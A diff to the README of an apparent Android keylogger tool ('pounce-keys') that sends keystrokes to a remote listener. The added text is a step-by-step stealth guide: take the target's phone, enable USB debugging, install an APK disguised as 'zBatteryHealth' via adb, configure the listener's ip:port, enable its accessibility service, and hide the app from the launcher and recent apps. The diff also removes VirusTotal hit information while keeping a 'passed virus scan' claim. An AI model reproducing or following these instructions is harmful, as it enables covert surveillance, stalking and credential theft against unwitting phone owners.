@@ -36,7 +36,7 @@
 
 
 
-
+✅ PASSED GOOGLE VIRUS SCAN
 
 ![ezgif-1-3870480794](https://user-images.githubusercontent.com/28081004/216004733-5f6f5584-80c8-4724-aed4-dd70bd151f20.gif)
 
@@ -48,7 +48,7 @@
 delay in listener is only due to recording
 
 # Update
-added a name "zBatteryHealth" to the stealth version to avoid showing at the top of the installed apps list
+added a name "zBatteryHealth" to the stealth version to avoid showing at the top of the installed apps list and made a detailed stealth guide
 
 
 # Listener Features ![Linode](https://img.shields.io/badge/Supports-Linode-green)  ![Linode](https://img.shields.io/badge/Kali-Linux-blue)
@@ -99,7 +99,21 @@ sudo ufw allow 4444 "if on linode or on WAN"
 
 
 # STEALTH
-TIP! install via ADB to avoid recent apps timestamp, also settings does not show in this list, also to assure hiiden icon in some cases
+TIP! install via ADB to avoid recent apps timestamp, also settings does not show in this list, also to assure hiden icon in some cases
+
+1. have a device with adb setup in a terminal and run adb tcpip 5555 with a phone charger plugged in (also have the stealth apk ready in same dir)
+2. make a new folder on the adb pc with this structure com.BatteryHealth/files/keys/fix.dat
+3. in the fix.dat file you made, insert ip:port in line 1 and save (ip and port of remote device with pounce-keys listener, works in linode)
+4. grab target device , open settings , enable dev options if need be then usb debugging
+5. connect phone , tap always allow usb debug
+6. run adb tcpip 5555 again and run adb install Stealth.apk (this hides from recent apps and settings sometimes does not even show as opened)
+7. turn off usb debug and enable the accessibility service
+8. copy and paste the com.BatteryHealth folder into android/data after turning on file tranfer
+
+in android 9 and bellow this will install the app with no icon on the launcher or docked apps (wont even be on the screen, perioid)
+only way you can see this is if you open accessibility settings or scroll all the way down in installed apps as its never a recent one.
+10 and up this will add a shortut named ZbatteryHealth with no icon but will be seen in the launcher, move it to a folder or replace app name with \ in 
+manifest file but this will make the app show in the top of installed
 
 due to new security features android API 29 and above (Oreo and up I believe) it will make it hard to near impossible to hide the app without root.
 The stealth version does not allow the app to be open, just a white icon, and it just opens the app details menu, sits in the app drawer.
@@ -115,12 +129,8 @@ android BELLOW Oreo, API 29 and up it will just open app info not showing the IP
 ![Screenshot_20230121_092852](https://user-images.githubusercontent.com/28081004/213873696-b7104b3c-7a17-46a5-a80d-11af8cfee183.png) ![Screenshot_20230121_092759](https://user-images.githubusercontent.com/28081004/213873716-8d0265db-4b4a-443f-8749-7549fa4f2f48.png)
 
 
-# Virus Total
-normal APK hash b8c49cb5d9e931a2f25898c74a729fe642d725ab9b7878b39a7b46f9fa9e02f5 (you can search by hash, 3 hits)
 
-stealth APK hash aab9a81cb74ee778cfdbbc1ff06d9fb4df04a03752cceb50afc3aee39e7aa5f5 
 
-✅ PASSED GOOGLE VIRUS SCAN
 
 # NORMAL INSTALL
 
